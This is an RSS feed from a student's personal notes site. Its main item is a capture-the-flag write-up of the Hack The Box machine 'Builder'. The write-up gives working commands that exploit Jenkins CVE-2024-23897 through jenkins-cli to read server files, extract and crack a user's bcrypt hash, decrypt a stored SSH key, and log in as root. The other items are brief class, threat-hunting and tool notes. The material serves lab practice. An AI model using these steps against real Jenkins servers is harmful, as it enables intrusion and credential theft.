<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
    <channel>
      <title>Paul&#039;s Docs</title>
      <link>https://quartz.paulgleason.dev</link>
      <description>Last 10 notes on Paul&#039;s Docs</description>
      <generator>Quartz -- quartz.jzhao.xyz</generator>
      <item>
    <title>Builder</title>
    <link>https://quartz.paulgleason.dev/everything/Cyber/HTB/htb-builder</link>
    <guid>https://quartz.paulgleason.dev/everything/Cyber/HTB/htb-builder</guid>
    <description>Builder Difficulty: Medium OS: Linux Date: 2024-03-07 Completed:complete Enumeration The target is listening on only ports 22 and 8080. The service which is running on 8080 is Jenkins (10.0.18) sudo nmap -p- --min-rate 10000 -oA scans/tcp_allports builder.htb .. PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy .. sudo nmap -p 22,8080 -sC -sV -oA scans/tcp_scripts builder.htb .. PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 |_http-title: Dashboard [Jenkins] | http-robots.txt: 1 disallowed entry |_/ | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Jetty(10.0.18) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel .. There are no hidden files or VHOSTs, etc., just the Jenkins page. Foothold The CVE used to exploit Jenkins CLI CVE-2024-23897 For the Jenkins version running the jenkins-cli can be exploited by downloading the jenkins-cli.jar off the website then using that to get a foothold. Download jenkins-cli Download: wget builder.htb:8080/jnlpJars/jenkins-cli.jar Usage: java -jar jenkins-cli.jar -s &#039;http://10.10.11.10:8080&#039; help Get Commands list Get all help command: The sed is looking for 2 spaces and to remove them. java -jar jenkins-cli.jar -s builder.htb:8080 help 2&gt;&amp;1 | sed -n &#039;/[A-Z]/!s/ *//gp&#039; add-job-to-view build cancel-quiet-down clear-queue connect-node console copy-job create-credentials-by-xml .. Execute Command list head commands.txt | xargs -I {} sh -c &quot;java -jar jenkins-cli.jar -s builder.htb:8080 &#039;{}&#039; @/etc/passwd &gt; &#039;cmd/{}.out&#039; 2&gt;&amp;1&quot; The command with the largest output was the connect-node command: find cmd | xargs wc -l | sort -nr | head wc: cmd: Is a directory 63 total 22 cmd/connect-node.out 7 cmd/create-credentials-by-xml.out 6 cmd/create-job.out 6 cmd/create-credentials-domain-by-xml.out 5 cmd/clear-queue.out 5 cmd/cancel-quiet-down.out 3 cmd/copy-job.out 3 cmd/console.out 3 cmd/build.out Getting Access to user The users.xml was found my looking through the Jenkins documentation page and I can across this resource which details that the users information had been migrated to /users/users.xml below you can see the output of going to that file. For getting the actual user information I was about to find this security update which details how the user migration was taking place for upgrading to Jenkins LTS 2.138.x. It shows that “In this case, rename the directory $JENKINS_HOME/users/admin_6635238516816951048/” which is how I was about to find jennifers hash. Jenkins stores its users in /var/jenkins_home/users/users.xml this is where I found jennifer_12108429903186576833 java -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/users.xml .. &lt;?xml version=&#039;1.1&#039; encoding=&#039;UTF-8&#039;?&gt;: No such agent &quot;&lt;?xml version=&#039;1.1&#039; encoding=&#039;UTF-8&#039;?&gt;&quot; exists. &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;: No such agent &quot; &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;&quot; exists. &lt;idToDirectoryNameMap class=&quot;concurrent-hash-map&quot;&gt;: No such agent &quot; &lt;idToDirectoryNameMap class=&quot;concurrent-hash-map&quot;&gt;&quot; exists. &lt;entry&gt;: No such agent &quot; &lt;entry&gt;&quot; exists. &lt;string&gt;jennifer&lt;/string&gt;: No such agent &quot; &lt;string&gt;jennifer&lt;/string&gt;&quot; exists. &lt;version&gt;1&lt;/version&gt;: No such agent &quot; &lt;version&gt;1&lt;/version&gt;&quot; exists. &lt;/hudson.model.UserIdMapper&gt;: No such agent &quot;&lt;/hudson.model.UserIdMapper&gt;&quot; exists. &lt;/idToDirectoryNameMap&gt;: No such agent &quot; &lt;/idToDirectoryNameMap&gt;&quot; exists. &lt;hudson.model.UserIdMapper&gt;: No such agent &quot;&lt;hudson.model.UserIdMapper&gt;&quot; exists. &lt;/entry&gt;: No such agent &quot; &lt;/entry&gt;&quot; exists. .. Using jennifer_12108429903186576833 in the path for user configs /var/jenkins_home/users/jennifer_12108429903186576833/config.xml we find in this file at the end there is a password hash. java -jar jenkins-cli.jar -s builder.htb:8080 connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml .. &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;: No such agent &quot; &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;&quot; exists. .. I took this has and made the file below: cat jennifer_hash jennifer:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a Then I used the hashcat command. Which cracked the password which came out to princess. With this password I am about to log into the Jenkins webpage as Jennifer. $ hashcat -m 3200 jennifer_hash --user /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt .. $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess .. User After logging into the Jenkins webpage I started digging around and came across the root user configuration. After trying to play with the update credentials I started digging in the html and was able to find: The key will be pretty long: &lt;input name=&quot;_.privateKey&quot; type=&quot;hidden&quot; value=&quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&quot;&gt;&lt;/div&gt; From here going the /script and doing the following from here println( hudson.util.Secret.decrypt(&quot;{AQAAABAAAAowLr....MR8IMMaKSM=}&quot;) ) This will output the private key: Privilege Escalation From getting the ssh key we can copy the private key to host system and make a keyfile: kali@kali:~/htb$ vim builder-key kali@kali:~/htb$ chmod 600 builder-key kali@kali:~/htb$ ssh -i builder-key root@builder.htb root@builder:~# ls root.txt If we look in the directory /home/jennifer we will find: root@builder:~# ls -la /home/jennifer/ total 28 drwxr-x--- 3 jennifer jennifer 4096 Feb 9 15:45 . drwxr-xr-x 3 root root 4096 Feb 9 15:45 . lrwxrwxrwx 1 root root 9 Feb 9 14:31 .bash_history -&gt; /dev/null -rw-r--r-- 1 jennifer jennifer 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 jennifer jennifer 3771 Jan 6 2022 .bashrc drwx------ 2 jennifer jennifer 4096 Feb 9 15:45 .cache -rw-r--r-- 1 jennifer jennifer 807 Jan 6 2022 .profile -rw-r----- 1 root jennifer 33 Mar 8 05:02 user.txt.</description>
    <pubDate>Wed, 20 Mar 2024 22:18:53 GMT</pubDate>
  </item><item>
    <title>ancient-encodings</title>
    <link>https://quartz.paulgleason.dev/everything/Cyber/HTB/htb-challenge-ancient-encodings</link>
    <guid>https://quartz.paulgleason.dev/everything/Cyber/HTB/htb-challenge-ancient-encodings</guid>
    <description>Ancient Encodings Difficulty: Very easy Category: Crypto Date: 2024-03-20 Completed:complete Background Your initialization sequence requires loading various programs to gain the necessary knowledge and skills for your journey ...</description>
    <pubDate>Wed, 20 Mar 2024 22:18:53 GMT</pubDate>
  </item><item>
    <title>011 - HTB</title>
    <link>https://quartz.paulgleason.dev/everything/Cyber/011---HTB</link>
    <guid>https://quartz.paulgleason.dev/everything/Cyber/011---HTB</guid>
    <description>MOCs Active Boxes/Challenges/Sherlocks Active HTB boxes/challenges/sherlocks will not be published but will be shown on this list as they’re retired they will become index able pages ...</description>
    <pubDate>Wed, 20 Mar 2024 22:18:53 GMT</pubDate>
  </item><item>
    <title>020 Undergrad - Champlain</title>
    <link>https://quartz.paulgleason.dev/020-Undergrad---Champlain</link>
    <guid>https://quartz.paulgleason.dev/020-Undergrad---Champlain</guid>
    <description>MOCs Classes Clubs .</description>
    <pubDate>Wed, 20 Mar 2024 01:31:30 GMT</pubDate>
  </item><item>
    <title>Class Dashboard</title>
    <link>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Classes/Class-Dashboard</link>
    <guid>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Classes/Class-Dashboard</guid>
    <description>MOCs Senior SP24 FA23 Junior SP23 FA22 Sophomore SP22 FA21 Freshman SP21 FA20.</description>
    <pubDate>Wed, 20 Mar 2024 01:31:30 GMT</pubDate>
  </item><item>
    <title>CCDC Dashboard</title>
    <link>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Dashboard</link>
    <guid>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Dashboard</guid>
    <description>MOCs Threat Hunting .</description>
    <pubDate>Wed, 20 Mar 2024 01:31:30 GMT</pubDate>
  </item><item>
    <title>Linux threat Hunting</title>
    <link>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Linux-Threat-Hunting</link>
    <guid>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Clubs/CCDC/CCDC-Linux-Threat-Hunting</guid>
    <description>MOCs [[#looking-at-etcpasswd|Looking at /etc/passwd]] [[#decoding-etcpasswd|Decoding /etc/passwd]] Bash Hardlinks Debugfs Processes Tree Network Monitoring Finding Hidden Process Ways to Find Process Finding Hidden Process Searching Files Search Files based on Time After Date Search Between Dates Newer Than Other File Who Is Logged In Hunting Techniques Looking at /etc/passwd If use has /bin/bash then has access to the bash shell if user has /no/login the user can’t log in ...</description>
    <pubDate>Wed, 20 Mar 2024 01:31:30 GMT</pubDate>
  </item><item>
    <title>Clubs Dashboard</title>
    <link>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Clubs/Clubs-Dashboard</link>
    <guid>https://quartz.paulgleason.dev/everything/School/Undergrad---Champlain/Clubs/Clubs-Dashboard</guid>
    <description>MOCs CCDC FOTC .</description>
    <pubDate>Wed, 20 Mar 2024 01:31:30 GMT</pubDate>
  </item><item>
    <title>NMAP</title>
    <link>https://quartz.paulgleason.dev/everything/Refernces/NMAP</link>
    <guid>https://quartz.paulgleason.dev/everything/Refernces/NMAP</guid>
    <description>MOC Useful Commands sudo nmap -p- --min-rate 10000 -oA scans/tcp_allports IP sudo nmap -p PORT1,PORT2,.. -sC -sV -oA scans/tcp_scripts IP Cheat Sheet All Arguements.</description>
    <pubDate>Fri, 08 Mar 2024 02:23:38 GMT</pubDate>
  </item><item>
    <title>Kitty</title>
    <link>https://quartz.paulgleason.dev/everything/Refernces/Kitty</link>
    <guid>https://quartz.paulgleason.dev/everything/Refernces/Kitty</guid>
    <description>Kitty Config Commands Usage Kittens This all copies term info files for kitty and magically enables shell integration kitten ssh user@ip .</description>
    <pubDate>Fri, 08 Mar 2024 01:05:05 GMT</pubDate>
  </item>
    </channel>
  </rss>